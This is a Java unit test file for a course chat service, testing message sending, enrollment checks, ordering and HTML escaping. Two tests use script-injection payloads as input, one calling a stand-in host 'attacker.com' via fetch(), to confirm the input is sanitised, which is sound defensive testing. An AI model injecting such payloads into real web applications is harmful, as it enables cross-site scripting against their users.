package com.grupo.learningmore.services;

import com.grupo.learningmore.domain.chat.ChatMessage;
import com.grupo.learningmore.domain.chat.ChatRoom;
import com.grupo.learningmore.dto.request.SendMessageRequest;
import com.grupo.learningmore.dto.response.ChatMessageResponse;
import com.grupo.learningmore.exceptions.AccessDeniedException;
import com.grupo.learningmore.repositories.ChatMessageRepository;
import com.grupo.learningmore.repositories.ChatRoomRepository;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;

import org.mockito.InjectMocks;
import org.mockito.Mock;
import org.mockito.junit.jupiter.MockitoExtension;
import org.springframework.data.domain.Page;
import org.springframework.data.domain.PageImpl;
import org.springframework.data.domain.Pageable;

import java.util.Date;
import java.util.List;
import java.util.Optional;
 

import static org.junit.jupiter.api.Assertions.*;
import static org.mockito.Mockito.*;

@ExtendWith(MockitoExtension.class)
class ChatServiceTest {

    @Mock
    private ChatMessageRepository chatMessageRepository;

    @Mock
    private ChatRoomRepository chatRoomRepository;

    @Mock
    private EnrollmentService enrollmentService;

    @InjectMocks
    private ChatService chatService;

    private String chatRoomId;
    private String userId;

    @BeforeEach
    void setup() {
        chatRoomId = "chatRoom123";
        userId = "user123";
    }

    @Test
    void shouldSendCourseQuestionSuccessfully() {

        SendMessageRequest request = new SendMessageRequest("Professor, could you clarify the assignment deadline?");

        ChatRoom room = new ChatRoom();

        ChatMessage savedMessage = new ChatMessage();

 
        savedMessage.setContent(
                "Professor, could you clarify the assignment deadline?"
        );

        savedMessage.setSentAt(new Date());

        when(enrollmentService.isUserEnrolled(userId, chatRoomId))
                .thenReturn(true);

        when(chatRoomRepository.findById(chatRoomId))
                .thenReturn(Optional.of(room));

        when(chatMessageRepository.save(any(ChatMessage.class)))
                .thenReturn(savedMessage);

        ChatMessageResponse response =
                chatService.sendMessage(userId, chatRoomId, request);

        assertNotNull(response);

        assertEquals(
                "Professor, could you clarify the assignment deadline?",
                response.content()
        );

        verify(chatMessageRepository, times(1))
                .save(any(ChatMessage.class));
    }

    @Test
    void shouldRejectUnauthorizedCourseAccess() {

        SendMessageRequest request = new SendMessageRequest("Trying to access restricted course chat");

        ChatRoom room = new ChatRoom();

        when(chatRoomRepository.findById(chatRoomId))
                .thenReturn(Optional.of(room));

        when(enrollmentService.isUserEnrolled(userId, chatRoomId))
                .thenReturn(false);

        assertThrows(
                AccessDeniedException.class,
                () -> chatService.sendMessage(
                        userId,
                        chatRoomId,
                        request
                )
        );

        verify(chatMessageRepository, never())
                .save(any(ChatMessage.class));
    }

    @Test
    void shouldSanitizeMaliciousScriptInjection() {

        SendMessageRequest request = new SendMessageRequest("<script>fetch('http://attacker.com')</script>");


        ChatRoom room = new ChatRoom();

        ChatMessage savedMessage = new ChatMessage();

 
        savedMessage.setContent(
                "&lt;script&gt;fetch('http://attacker.com')" +
                        "&lt;/script&gt;"
        );

        savedMessage.setSentAt(new Date());

        when(enrollmentService.isUserEnrolled(userId, chatRoomId))
                .thenReturn(true);

        when(chatRoomRepository.findById(chatRoomId))
                .thenReturn(Optional.of(room));

        when(chatMessageRepository.save(any(ChatMessage.class)))
                .thenReturn(savedMessage);

        ChatMessageResponse response =
                chatService.sendMessage(userId, chatRoomId, request);

        assertEquals(
                "&lt;script&gt;fetch('http://attacker.com')" +
                        "&lt;/script&gt;",
                response.content()
        );
    }

    @Test
    void shouldReturnOrderedDiscussionMessages() {

        ChatMessage msg1 = new ChatMessage();
        
        msg1.setContent("Does anyone understand exercise 3?");
        msg1.setSentAt(new Date(System.currentTimeMillis() - 1000));

        ChatMessage msg2 = new ChatMessage();
        
        msg2.setContent("Yes, the professor explained it in class yesterday.");
        msg2.setSentAt(new Date());

        when(chatRoomRepository.existsById(chatRoomId))
                .thenReturn(true);

        Page<ChatMessage> page = new PageImpl<>(List.of(msg1, msg2));

        when(chatMessageRepository.findByChatRoomIdOrderBySentAtAsc(
                eq(chatRoomId),
                any(Pageable.class)
        )).thenReturn(page);

        Page<ChatMessageResponse> responses =
                chatService.getMessages(chatRoomId, Pageable.unpaged());

        assertEquals(2, responses.getContent().size());

        assertEquals(
                "Does anyone understand exercise 3?",
                responses.getContent().get(0).content()
        );

        assertEquals(
                "Yes, the professor explained it in class yesterday.",
                responses.getContent().get(1).content()
        );
    }

    @Test
    void shouldThrowExceptionWhenChatRoomDoesNotExist() {

        when(chatRoomRepository.existsById(chatRoomId))
                .thenReturn(false);

        RuntimeException exception = assertThrows(
                RuntimeException.class,
                () -> chatService.getMessages(chatRoomId, Pageable.unpaged())
        );

        assertEquals("Chat room not found", exception.getMessage());

        verify(chatRoomRepository).existsById(chatRoomId);
        verifyNoInteractions(chatMessageRepository);
    }

    @Test
    void shouldPopulateChatMessageCorrectlyWhenSendingMessage() {

        SendMessageRequest request = new SendMessageRequest("Hello professor");

        ChatRoom room = new ChatRoom();

        when(enrollmentService.isUserEnrolled(userId, chatRoomId))
                .thenReturn(true);

        when(chatRoomRepository.findById(chatRoomId))
                .thenReturn(Optional.of(room));

        when(chatMessageRepository.save(any(ChatMessage.class)))
                .thenAnswer(invocation -> invocation.getArgument(0));

        chatService.sendMessage(userId, chatRoomId, request);

        verify(chatMessageRepository).save(argThat(msg ->
                msg.getContent().equals("Hello professor") &&
                        msg.getSentAt() != null &&
                        msg.getChatRoom() != null
        ));
    }

    @Test
    void shouldEnsureMessageIsSanitizedAndNotEqualToOriginal() {

        SendMessageRequest request = new SendMessageRequest("<script>alert('hack')</script>");

        ChatRoom room = new ChatRoom();

        when(enrollmentService.isUserEnrolled(userId, chatRoomId))
                .thenReturn(true);

        when(chatRoomRepository.findById(chatRoomId))
                .thenReturn(Optional.of(room));

        when(chatMessageRepository.save(any(ChatMessage.class)))
                .thenAnswer(invocation -> invocation.getArgument(0));

        ChatMessageResponse response =
                chatService.sendMessage(userId, chatRoomId, request);

        assertNotEquals("<script>alert('hack')</script>", response.content());

        assertTrue(response.content().contains("&lt;"));
        assertTrue(response.content().contains("&gt;"));
    }


    @Test
    void shouldExecuteSendMessageMappingLogic() {

        SendMessageRequest request = new SendMessageRequest("Hello");

        ChatRoom room = new ChatRoom();

        when(enrollmentService.isUserEnrolled(userId, chatRoomId))
                .thenReturn(true);

        when(chatRoomRepository.findById(chatRoomId))
                .thenReturn(Optional.of(room));

        when(chatMessageRepository.save(any(ChatMessage.class)))
                .thenAnswer(invocation -> invocation.getArgument(0));

        ChatMessageResponse response =
                chatService.sendMessage(userId, chatRoomId, request);

        assertNotNull(response.content());
        assertEquals("Hello", response.content());
    }

    @Test
    void shouldPreserveMessageFlowEndToEnd() {

        SendMessageRequest request = new SendMessageRequest("Message flow test");

        ChatRoom room = new ChatRoom();

        when(enrollmentService.isUserEnrolled(userId, chatRoomId))
                .thenReturn(true);

        when(chatRoomRepository.findById(chatRoomId))
                .thenReturn(Optional.of(room));

        when(chatMessageRepository.save(any(ChatMessage.class)))
                .thenAnswer(invocation -> invocation.getArgument(0));

        ChatMessageResponse response =
                chatService.sendMessage(userId, chatRoomId, request);

        assertAll(
                () -> assertEquals("Message flow test", response.content()),
                () -> assertNotNull(response),
                () -> assertFalse(response.content().isBlank())
        );
    }

    @Test
    void shouldExecuteSendMessageLambdaCoverage() {

        SendMessageRequest request = new SendMessageRequest("lambda coverage test");

        ChatRoom room = new ChatRoom();

        when(enrollmentService.isUserEnrolled(userId, chatRoomId))
                .thenReturn(true);

        when(chatRoomRepository.findById(chatRoomId))
                .thenAnswer(invocation -> {
                    return Optional.of(room);
                });

        when(chatMessageRepository.save(any(ChatMessage.class)))
                .thenAnswer(invocation -> invocation.getArgument(0));

        ChatMessageResponse response =
                chatService.sendMessage(userId, chatRoomId, request);

        assertNotNull(response);
        assertEquals("lambda coverage test", response.content());
    }

    @Test
    void shouldThrowWhenChatRoomNotFound_realPath() {

        SendMessageRequest request = new SendMessageRequest("test");

        when(chatRoomRepository.findById(chatRoomId))
                .thenReturn(Optional.empty());

        RuntimeException ex = assertThrows(
                RuntimeException.class,
                () -> chatService.sendMessage(userId, chatRoomId, request)
        );

        assertEquals("Chat room not found", ex.getMessage());
    }
}
